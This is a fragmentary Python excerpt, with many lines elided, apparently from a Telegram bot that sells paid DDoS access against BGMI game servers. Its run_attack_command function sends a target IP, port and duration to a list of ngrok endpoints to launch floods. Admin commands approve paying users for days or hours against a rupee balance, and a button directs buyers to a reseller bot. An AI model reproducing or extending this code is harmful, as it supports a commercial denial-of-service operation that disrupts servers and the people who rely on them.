...
def run_attack_command(target, port, duration):
    files = ["legend.txt", "legend1.txt","legend2.txt", "legend3.txt","legend4.txt", "legend5.txt","legend6.txt", "legend7.txt","legend8.txt","legend9.txt","legend10.txt"]
    ...
    for current_file in files:
        try:
            ...
            url = f"{ngrok_url}/bgmi?ip={target}&port={port}&time={duration}"
    ...
    if str(message.chat.id) in ADMIN_IDS:
        ...
        if len(args) == 3:
            ...
            if admin_balances[str(message.chat.id)] >= cost:
                ...
                response = f"User ID: {user_id} approve successfully with authorization time in {duration} days. by {admin_username}"
            else:
            ...
            if admin_balances[str(message.chat.id)] >= cost:
                ...
                response = f"User ID: {user_id} approve successfully with authorization time in {hours} hours. by {admin_username}"
            else:
                response = f"Insufficient balance to add user. Required: {cost} Rs. Available: {admin_balances[str(message.chat.id)]} Rs."
        else:
            response = "Usage: /approve <userId> <duration_in_days>\nUsage: /approve <userId> hours <duration_in_hours>"
    else:
...
def handle_buy_access_button(message):
    response = (f"Contact @BGMIOFFICIALSERVICE_BOT for reseller ship")
    bot.send_message(message.chat.id, response)
